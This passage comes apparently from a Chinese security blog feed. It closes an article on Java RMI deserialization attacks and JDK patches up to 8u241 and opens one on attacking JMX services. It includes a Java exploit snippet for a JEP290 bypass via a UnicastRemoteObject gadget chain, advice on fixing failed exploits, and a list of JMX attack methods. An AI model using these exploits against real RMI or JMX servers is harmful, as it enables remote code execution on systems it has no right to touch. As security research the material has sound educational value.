class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">1、白名单中的类(可绕过JEP290)，并且存在readObject/readExternal方法<br>2、readObject/readExternal方法最终可以触发UnicastRef<span class="hljs-comment">#invoke</span><br>3、因为RemoteObjectInvocationHandler的特点：<br>  a、存在RemoteRef类型（UnicastRef的父类）的属性（ref）<br>  b、RemoteObjectInvocationHandler<span class="hljs-comment">#invoke会调用ref.invoke</span><br>  c、RemoteObjectInvocationHandler本身实现了InvocationHandler，可作为动态代理的处理handler，在调用被代理接口方法时会先调用RemoteObjectInvocationHandler<span class="hljs-comment">#invoke</span><br>所以条件2就变成了：反序列化方法中最终可以触发其属性的方法，属性接口使用RemoteObjectInvocationHandler代理即可<br></code></pre></td></tr></table></figure><p>顺着这个思路，找到JEP290的白名单中有个java.rmi.server.UnicastRemoteObject，这个类的readObject()方法最终会调用到其属性值ssf的createServerSocket方法</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/42.png"></p><p>这里用到了动态代理的特性：当调用ssf属性的createServerSocket方法时，会调用handler.invoke()，即这里会调用RemoteObjectInvocationHandler#invoke</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/43.png"></p><p>而RemoteObjectInvocationHandler的ref属性为我们构造的UnicastRef对象，所以会调用到sun.rmi.server.UnicastRef#invoke(java.rmi.Remote, java.lang.reflect.Method, java.lang.Object[], long)，接下来就与UnicastRef链一致了</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/44.png"></p><p>最终的调用链：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus">UnicastRemoteObject gadget chain：<br>java<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.UnicastRemoteObject<span class="hljs-selector-id">#readObject</span><br>java<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.UnicastRemoteObject<span class="hljs-selector-id">#reexport</span><br>java<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.UnicastRemoteObject<span class="hljs-selector-id">#exportObject</span><br>...<br>            sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span><span class="hljs-selector-class">.tcp</span>.TCPTransport<span class="hljs-selector-id">#listen</span><br>                sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span><span class="hljs-selector-class">.tcp</span>.TCPEndpoint<span class="hljs-selector-id">#newServerSocket</span><br>                com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.proxy</span>.<span class="hljs-variable">$Proxy1</span><span class="hljs-selector-class">.createServerSocket</span>()<br>                    java<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.RemoteObjectInvocationHandler<span class="hljs-selector-id">#invoke</span><br>                        java<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.RemoteObjectInvocationHandler<span class="hljs-selector-id">#invokeRemoteMethod</span><br>                        sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.UnicastRef<span class="hljs-selector-id">#invoke</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span>.StreamRemoteCall<span class="hljs-selector-id">#executeCall</span><br>java<span class="hljs-selector-class">.io</span>.ObjectInputStream#readObject<br></code></pre></td></tr></table></figure><p>编写exp：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">gen<span class="hljs-constructor">UnicastRef()</span>为生成UnicastRef对象的方法<br>lookup<span class="hljs-literal">()</span>为我们重写的方法，可以传入Object类型<br><br>Registry registry = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LocateRegistry</span>.</span></span>get<span class="hljs-constructor">Registry(<span class="hljs-string">&quot;192.168.232.8&quot;</span>, 1099)</span>;<br>RemoteObjectInvocationHandler remoteObjectInvocationHandler = <span class="hljs-keyword">new</span> <span class="hljs-constructor">RemoteObjectInvocationHandler(<span class="hljs-params">genUnicastRef</span>(<span class="hljs-string">&quot;192.168.232.1&quot;</span>,2233)</span>);<br>RMIServerSocketFactory rmiServerSocketFactory = (RMIServerSocketFactory) <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Proxy</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">ProxyInstance(RMIServerSocketFactory.<span class="hljs-params">class</span>.<span class="hljs-params">getClassLoader</span>()</span>, <span class="hljs-keyword">new</span> Class<span class="hljs-literal">[]</span>&#123;<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">RMIServerSocketFactory</span>.</span></span><span class="hljs-keyword">class</span>,<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Remote</span>.</span></span><span class="hljs-keyword">class</span>&#125;, remoteObjectInvocationHandler);<br>Constructor constructor = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">UnicastRemoteObject</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">DeclaredConstructor(<span class="hljs-params">null</span>)</span>;<br>constructor.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;<br>UnicastRemoteObject unicastRemoteObject = (UnicastRemoteObject) constructor.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(<span class="hljs-params">null</span>)</span>;<br>Field ssf = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">UnicastRemoteObject</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;ssf&quot;</span>)</span>;<br>ssf.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;<br>ssf.set(unicastRemoteObject, rmiServerSocketFactory);<br>lookup(registry, unicastRemoteObject);<br></code></pre></td></tr></table></figure><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/45.png"></p><p>使用UnicastRefRemoteObject链绕过官方对于UnicastRef链的修复</p><h3 id="5、jdk-x3D-8u241"><a href="#5、jdk-x3D-8u241" class="headerlink" title="5、jdk &#x3D; 8u241"></a>5、jdk &#x3D; 8u241</h3><h4 id="5-1-修复1：RMI-修复UnicastRefRemoteObject链绕过的问题"><a href="#5-1-修复1：RMI-修复UnicastRefRemoteObject链绕过的问题" class="headerlink" title="5.1 修复1：RMI 修复UnicastRefRemoteObject链绕过的问题"></a>5.1 修复1：RMI 修复UnicastRefRemoteObject链绕过的问题</h4><p>在jdk8u241对UnicastRefRemoteObject链的利用做了修复，有两处：</p><p>1、sun.rmi.registry.RegistryImpl_Skel的bind、lookup、unbind传输的String类型参数使用readObject(String.class)进行反序列化操作</p><p>2、java.rmi.server.RemoteObjectInvocationHandler#invokeRemoteMethod 在调用ref.invoke前检测Method对象表示方法所在类的Class对象（即这里Gadget chain中的RMIServerSocketFactory）是否实现了Remote接口</p><p>这两处补丁针对性修复了UnicastRefRemoteObject链，具体如下</p><p>sun.rmi.registry.RegistryImpl_Skel#lookup</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/46.png"></p><p>java.rmi.server.RemoteObjectInvocationHandler#invokeRemoteMethod</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/47.png"></p><p>var2 是调用栈中触发代理handler的方法（createServerSocket）， 我们无法控制此参数，Gadget中的关键类RMIServerSocketFactory没有实现Remote接口导致反序列化中断失败。修复的调用栈如下：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus">UnicastRemoteObject gadget chain：<br>java<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.UnicastRemoteObject<span class="hljs-selector-id">#readObject</span><br>java<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.UnicastRemoteObject<span class="hljs-selector-id">#reexport</span><br>java<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.UnicastRemoteObject<span class="hljs-selector-id">#exportObject</span><br>...<br>            sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span><span class="hljs-selector-class">.tcp</span>.TCPTransport<span class="hljs-selector-id">#listen</span><br>                sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span><span class="hljs-selector-class">.tcp</span>.TCPEndpoint<span class="hljs-selector-id">#newServerSocket</span><br>                com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.proxy</span>.<span class="hljs-variable">$Proxy1</span><span class="hljs-selector-class">.createServerSocket</span>()<br>                    java<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.RemoteObjectInvocationHandler<span class="hljs-selector-id">#invoke</span><br>                        java<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.RemoteObjectInvocationHandler<span class="hljs-selector-id">#invokeRemoteMethod</span><span class="hljs-comment">//修复2</span><br>                        sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.UnicastRef<span class="hljs-selector-id">#invoke</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span>.StreamRemoteCall<span class="hljs-selector-id">#executeCall</span><br>java<span class="hljs-selector-class">.io</span>.ObjectInputStream#readObject<br></code></pre></td></tr></table></figure><h3 id="6、jdk-≥-8u241-的利用方式—应用层反序列化问题"><a href="#6、jdk-≥-8u241-的利用方式—应用层反序列化问题" class="headerlink" title="6、jdk ≥ 8u241 的利用方式—应用层反序列化问题"></a>6、jdk ≥ 8u241 的利用方式—应用层反序列化问题</h3><blockquote><p>目前如果目标的JDK版本大于或等于8u241，暂无法利用内置方法完成攻击。但是还可以寻找应用程序级别的方法，当传递的是Object、Remote、Map等类型参数时，我们可以利用其传递构造的恶意对象进行利用。</p></blockquote><p>在3.2章节我们利用“调用自定义方法”的逻辑去调用了内置的bind方法，系统在处理参数时使用反序列化操作无过滤导致出现问题。这里利用的也是这个原理，当客户端调用服务端自定义方法时，服务端根据<code>hashToMethod_Map.get(方法hash值)</code>确认目标方法、unmarshalParameters解析参数、最后invoke反射调用<img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/48.png"></p><p>在sun.rmi.server.UnicastServerRef#unmarshalParametersUnchecked方法中对每个参数依次解析</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/49.png"></p><p>sun.rmi.server.UnicastRef#unmarshalValue 当参数类型非基本数据类型、非String类型时直接调用readObject</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/50.png"></p><h3 id="7、错误排查"><a href="#7、错误排查" class="headerlink" title="7、错误排查"></a>7、错误排查</h3><p>在漏洞利用过程中会出现各种报错，本节分析各种报错出现原因及对应解决绕过方案</p><h4 id="7-1-ObjectInputFilter-REJECTED"><a href="#7-1-ObjectInputFilter-REJECTED" class="headerlink" title="7.1  ObjectInputFilter REJECTED"></a>7.1  ObjectInputFilter REJECTED</h4><p>当使用Ysoserial的ysoserial.exploit.RMIRegistryExploit结合CommonsCollections6利用链攻击目标RMI服务器时出现该报错</p><p>目标RMI服务日志信息：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">ObjectInputFilter REJECTED: class sun.reflect.annotation.AnnotationInvocationHandler, array length: -1, nRefs: 6, depth: 2, bytes: 298, ex: n/a<br></code></pre></td></tr></table></figure><p>攻击者日志信息：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">java<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.InvalidClassException</span>: <span class="hljs-attribute">filter</span> status: REJECTED<br></code></pre></td></tr></table></figure><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/51.png"></p><p>这种情况下是本文2.1限制1中提到的JEP290生效，用于包装CommonsCollections6的AnnotationInvocationHandler不在JEP290的白名单中导致漏洞利用失败。利用UnicastRef链绕过即可</p><h4 id="7-2-Registry-Registry-bind-disallowed"><a href="#7-2-Registry-Registry-bind-disallowed" class="headerlink" title="7.2 Registry.Registry.bind disallowed"></a>7.2 Registry.Registry.bind disallowed</h4><p>当使用绕过JEP290的UnicastRef链结合RMIConnectionImpl_Stub类攻击目标RMI服务器时出现该报错</p><p>攻击者日志信息：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">java.rmi.AccessException: Registry.Registry.bind disallowed; <span class="hljs-built_in">origin</span> /<span class="hljs-number">192.168</span><span class="hljs-number">.232</span><span class="hljs-number">.1</span> <span class="hljs-built_in">is</span> non-<span class="hljs-built_in">local</span> host<br></code></pre></td></tr></table></figure><p>目标环境为JDK8u121</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/52.png"></p><p>目标环境为JDK8u141</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/53.png"></p><p>仔细查看发现虽然报错都是Registry.Registry.bind disallowed，但是前者利用成功，后者却失败了。141的调用栈并没有执行到RegistryImpl.bind。该种情况与本文3.1章节中分析的一致，Oracle官方将checkAccess地址检查从RegistryImpl.bind提前到了RegistryImpl_Skel.dispatch，导致漏洞利用失败。所以我们根据报错可以推断出利用情况：如果调用栈执行到了RegistryImpl.bind再报错，说明漏洞利用已经完成，反之则说明目标JDK版本大于等于8u141，需要使用我们改造的lookup进行利用</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/54.png"></p><h4 id="7-3-java-lang-ClassCastException-xxx-cannot-be-cast-to-java-lang-String"><a href="#7-3-java-lang-ClassCastException-xxx-cannot-be-cast-to-java-lang-String" class="headerlink" title="7.3 java.lang.ClassCastException: xxx cannot be cast to java.lang.String"></a>7.3 java.lang.ClassCastException: xxx cannot be cast to java.lang.String</h4><p>当使用绕过JEP290—local限制的UnicastRef链结合RMIConnectionImpl_Stub类、改造的lookup()攻击目标RMI服务器，效果及报错如上图。虽然报类型转换错误，但是漏洞已经利用完成</p><h4 id="7-4-Cannot-cast-an-object-to-java-lang-String"><a href="#7-4-Cannot-cast-an-object-to-java-lang-String" class="headerlink" title="7.4 Cannot cast an object to java.lang.String"></a>7.4 Cannot cast an object to java.lang.String</h4><p>当使用UnicastRemoteObject链结合改造的lookup()攻击基于JDK8u241的目标RMI服务器时出现该报错</p><p>攻击者日志信息：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.ClassCastException</span>: Cannot cast an <span class="hljs-selector-tag">object</span> to java<span class="hljs-selector-class">.lang</span>.String<br></code></pre></td></tr></table></figure><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/55.png"></p><p>这种情况是本章5.1提到的Oracle官方在JDK8u241用于修复UnicastRefRemoteObject链的补丁，最终在反序列化时报错java.io.ObjectInputStream#readObject0</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/56.png"></p><p>这种情况下说明目标的JDK版本高于或等于8u241版本，目前只能使用应用层的方法进行利用了</p><h2 id="3、总结"><a href="#3、总结" class="headerlink" title="3、总结"></a>3、总结</h2><p>本文基于Oracle官方对于RMI利用的修复历史，依次分析了JDK8u121的JEP290修复绕过、JDK8u141的来源限制、JDK8u231对于UnicastRef链的修复、JDK8u241对于UnicastRefRemoteObject链的修复及各补丁的绕过情况。这部分知识网上资料很多，但大多是分析单个版本的利用手法、修复及绕过。自己看了一圈后，感觉还是懵懂，深知自己对于这部分内容的储备及理解不够，遂花了亿点时间整理此万字长文。也希望对各位学习这部分知识的师傅有帮助。</p><h2 id="4、参考"><a href="#4、参考" class="headerlink" title="4、参考"></a>4、参考</h2><p><a href="https://i.blackhat.com/eu-19/Wednesday/eu-19-An-Far-Sides-Of-Java-Remote-Protocols.pdf">https://i.blackhat.com/eu-19/Wednesday/eu-19-An-Far-Sides-Of-Java-Remote-Protocols.pdf</a><br><a href="https://su18.org/post/rmi-attack/">https://su18.org/post/rmi-attack/</a><br><a href="https://mogwailabs.de/en/blog/2019/03/attacking-java-rmi-services-after-jep-290/">https://mogwailabs.de/en/blog/2019/03/attacking-java-rmi-services-after-jep-290/</a><br><a href="https://www.anquanke.com/post/id/197829">https://www.anquanke.com/post/id/197829</a><br><a href="http://code2sec.com/cve-2017-3241-java-rmi-registrybindfan-xu-lie-hua-lou-dong.html">http://code2sec.com/cve-2017-3241-java-rmi-registrybindfan-xu-lie-hua-lou-dong.html</a><br><a href="https://xz.aliyun.com/t/7932">https://xz.aliyun.com/t/7932</a></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaSec</tag>
      
      <tag>RMI</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Attack JMX Service的打开方式</title>
    <link href="/2022/How-to-attack-RMI-based-JMX-services/"/>
    <url>/2022/How-to-attack-RMI-based-JMX-services/</url>
    
    <content type="html"><![CDATA[<p>有次漏洞挖掘项目中碰到了未授权JMX的情况，在复盘时发现对于整套攻击JMX服务的方式不太了解。趁着最近有时间 对JMX相关知识来次补充，遂写了此文。主要对JMX服务未鉴权时的利用方式、JMX各账户权限可对应执行的操作、Oracle官方对于漏洞的修复、鉴权后的攻击利用方式做了分析演示。在梳理完此文后基本上对攻击JMX服务有底了，也成功利用这些特性PWN掉了***产品，中间的过程也比较有趣，等有机会再做分享…</p><h2 id="1、基础知识"><a href="#1、基础知识" class="headerlink" title="1、基础知识"></a>1、基础知识</h2><p>JMX是JAVA1.5引入的新特性，全称为Java Management Extension，即Java管理扩展，是管理&#x2F;监控应用程序、设备、系统对象的工具。这些被管理的对象都可以抽象为MBean进行表示，客户端连接到服务端来管理MBean，如查询MBean属性、调用MBean方法等操作。而MBean的代码定义是有要求的，需要实现一个接口，所有需要对外公开的方法都需要在该接口中声明。另外此接口要求在MBean类名后加上MBean后缀，这里例子中的MBean类是Hello，接口为HelloMBean</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">//Hello.java</span><br>package org.<span class="hljs-property">example</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Hello</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HelloMBean</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> name = <span class="hljs-string">&quot;pwnull&quot;</span>;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getName</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">setName</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> newName</span>) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = newName;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">sayHello</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello: &quot;</span> + name;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>HelloMBean接口：</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-comment">//HelloMBean.java</span><br><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">HelloMBean</span> </span>&#123;<br>    <span class="hljs-comment">// getter and setter for the attribute &quot;name&quot;</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">String</span> getName();<br>    <span class="hljs-keyword">public</span> void setName(<span class="hljs-keyword">String</span> <span class="hljs-keyword">new</span><span class="hljs-type">Name</span>);<br>    <span class="hljs-comment">// Bean method &quot;sayHello&quot;</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">String</span> sayHello();<br>&#125;<br><br></code></pre></td></tr></table></figure><p>对于管理器而言，这些MBean中公开的方法，最终会被JMX转化为属性（ Attribute ）、调用（ Invoke ）、监听（ Listener ）等概念。默认情况下每个Java进程都运行着MBean管理服务，使用<code>ManagementFactory.getPlatformMBeanServer()</code>获取到MBeanServer后可对MBean进行操作。下面的例子模拟管理器注册MBean并显示当前java进程中的所有MBean</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/1.png"></p><p>如果想让我们的MBean在管理器上可调用，那么需要指定一个<code>ObjectName</code>对象，关于对象名称的详细语法可参考：<a href="https://www.oracle.com/java/technologies/javase/management-extensions-best-practices.html%E3%80%82">https://www.oracle.com/java/technologies/javase/management-extensions-best-practices.html。</a></p><p> Object Name 在注册MBean时用于指定名称，在查询的时候可以指定正则用于查询，去匹配名称符合正则条件的MBean。每个Object Name都需要包含一个type关键属性</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">//MBeanExample.java<br>package org.example;<br><br><span class="hljs-keyword">import</span> javax.management.MBeanServer;<br><span class="hljs-keyword">import</span> javax.management.ObjectInstance;<br><span class="hljs-keyword">import</span> javax.management.ObjectName;<br><span class="hljs-keyword">import</span> java.lang.management.ManagementFactory;<br><br><span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> MBeanExample &#123;<br>    <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main(String[] args) throws <span class="hljs-keyword">Exception</span> &#123;<br>        // <span class="hljs-keyword">Create</span> a <span class="hljs-built_in">new</span> MBean instance <span class="hljs-keyword">from</span> Hello (HelloMBean interface)<br>        Hello mbean = <span class="hljs-built_in">new</span> Hello();<br>        // <span class="hljs-keyword">Create</span> an <span class="hljs-keyword">object</span> <span class="hljs-type">name</span>,<br>        ObjectName mbeanName = <span class="hljs-built_in">new</span> ObjectName(&quot;org.example.Hello:type=HelloMBean&quot;);<br>        // <span class="hljs-keyword">Connect</span> <span class="hljs-keyword">to</span> the MBean <span class="hljs-keyword">server</span> <span class="hljs-keyword">of</span> the <span class="hljs-keyword">current</span> Java process<br>        MBeanServer <span class="hljs-keyword">server</span> = ManagementFactory.getPlatformMBeanServer();<br>        <span class="hljs-keyword">server</span>.registerMBean(mbean, mbeanName);<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">Object</span> <span class="hljs-keyword">object</span> : <span class="hljs-keyword">server</span>.queryMBeans(<span class="hljs-built_in">new</span> ObjectName(&quot;*:*&quot;), <span class="hljs-keyword">null</span>))<br>        &#123;<br>            <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println( ((ObjectInstance)<span class="hljs-keyword">object</span>).getObjectName() );<br>        &#125;<br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(&quot;Press any key to exit&quot;);<br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">in</span>.<span class="hljs-keyword">read</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用jconsole连接本地的org.example.MBeanExample类起的9052进程后，可以设置MBean的属性&#x2F;调用方法，如我们这里的sayHello()方法</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/2.png"></p><p>调用sayHello()方法</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/3.png"></p><p>也可以开启远程服务，将Hello、HelloMBean、MBeanExample打包为jmxserver.jar包后，用如下命令开启调试功能、JMX监听端口并设置非认证。这里为演示命令执行的效果，将groovy-2.3.9.jar添加到classpath中，方便我们后续利用Groovy Gadget</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -Xmx5g -Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=<span class="hljs-number">5005</span>  -Dcom.sun.management.jmxremote.port=<span class="hljs-number">2222</span> -Dcom.sun.management.jmxremote.authenticate=false -Dcom.sun.management.jmxremote.ssl=false -cp jmxserver.jar;C:\tools\apache-maven-<span class="hljs-number">3</span>.<span class="hljs-number">8</span>.<span class="hljs-number">6</span>-repository\org\codehaus\groovy\groovy\<span class="hljs-number">2</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>\groovy-<span class="hljs-number">2</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>.jar org.example.MBeanExample<br></code></pre></td></tr></table></figure><p><img src="/img/How-to-attack-RMI-based-JMX-services/4.png"></p><p>使用nmap扫描其端口可以看到，2222端口MBean管理服务实际上是基于RMI Registry的，对象名称为jmxrmi，stub端口为56139</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/5.png"></p><h2 id="2、攻击JMX"><a href="#2、攻击JMX" class="headerlink" title="2、攻击JMX"></a>2、攻击JMX</h2><p>我们按照整体调用流程、过程中存在的利用点、官方对漏洞的修复措施及后续利用进行分析，也为了方便理解，个人将攻击JMX服务分为5种利用方式：</p><p>1、jmx-url连接地址可控的JNDI注入利用方式</p><p>2、攻击RMI Registry的利用方式</p><p>3、RMI层”自定义”方法newClient利用方式</p><p>4、JMX层MBean方法getLoggerLevel&#x2F;gcClassHistogram利用方式</p><p>5、MLET动态加载Evil MBean的利用方式</p><p>第一种是针对JMX客户端的利用方式，也捎带看一下。后面几种都是针对JMX服务，其中234都需要目标ClassPath存在可用的Gadget链，而第5个MLET动态加载是载入执行攻击者创建的恶意MBean类方法，所以没有Gadget的限制。从整体看，JMX客户端与服务端交互的流程及利用点如下:</p><p>1、客户端使用javax.naming.InitialContext#lookup获取到名称为”jmxrmi”的 Stub代理对象，<strong>当JMX url可控时，会造成JNDI注入的问题</strong>。这是第一个利用点</p><p>2、客户端调用javax.management.remote.rmi.RMIServer#newClient去获取RMIConnectionImpl Stub代理对象。当JMX服务需要验证时，会使用JAAS-based authenticator进行权限校验：根据服务的启动参数及jmxremote.password、jmxremote.access配置文件去匹配，当校验通过后返回代理对象。<br>这部分会涉及两个利用点：<br>a、JMX底层是依据RMI进行通信，当JDK版本在低版本时，可以使用攻击RMI Registry的exp进行攻击，<strong>可利用bind&#x2F;lookup方法传输恶意序列数据&#x2F;UnicastRef链利用</strong>。这是第二个利用点<br>b、newClient方法符合我们在攻击RMI中提到的<strong>应用层反序列化问题</strong>情况，参数为Object类型，可以塞入我们的恶意Padyload数据。这是第三个利用点</p><p>3、客户端invoke调用RMIConnectionImpl Stub代理对象的方法去操作MBean&#x2F;获取MBean信息<br>这部分会涉及两个攻击点：<br>a、JMX层在<strong>还原MBean方法参数时也是采用反序列化方式</strong>进行还原的，所以可将恶意数据塞入默认MBean的有参方法。这是第四个利用点<br>b、在客户端连接成功创建MBean时，<strong>可调用MLET动态加载的方式去加载攻击者构建的Evil MBean完成利用</strong>。这是第五个利用点</p><p>下面是详细分析及密码验证后的绕过方式</p><h3 id="2-1-jmx-url连接地址可控的JNDI注入利用方式"><a href="#2-1-jmx-url连接地址可控的JNDI注入利用方式" class="headerlink" title="2.1 jmx-url连接地址可控的JNDI注入利用方式"></a>2.1 